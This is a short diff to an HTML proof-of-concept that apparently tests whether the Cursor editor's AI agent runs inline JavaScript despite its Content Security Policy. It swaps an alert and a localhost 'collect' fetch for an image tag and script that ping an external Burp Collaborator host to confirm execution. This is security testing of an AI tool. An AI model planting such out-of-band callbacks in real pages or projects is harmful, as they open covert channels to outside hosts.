@@ -2,16 +2,17 @@
 <html>
   <head>
     <title>Cursor CSP PoC</title>
-    <script>
-      alert('✅ PoC success: Inline JS executed inside Cursor agent');
-
-      fetch('http://localhost:9000/collect?from=cursor-agent')
-        .then(() => console.log('Fetched to localhost:9000'))
-        .catch(err => console.error('Fetch failed', err));
-    </script>
   </head>
   <body>
     <h1>Cursor CSP PoC</h1>
-    <p>If you see an alert, JS ran successfully.</p>
+    <p>If this file is rendered in a browser and CSP allows it, the browser will ping your Burp Collaborator server.</p>
+
+    <!-- Image-based OOB trigger -->
+    <img src="https://j5pmwvwgdnpiopk5je3eia2l1c73vujj.oastify.com/image.png" />
+
+    <!-- JS-based OOB trigger -->
+    <script>
+      new Image().src = "https://j5pmwvwgdnpiopk5je3eia2l1c73vujj.oastify.com/js-exec";
+    </script>
   </body>
 </html>
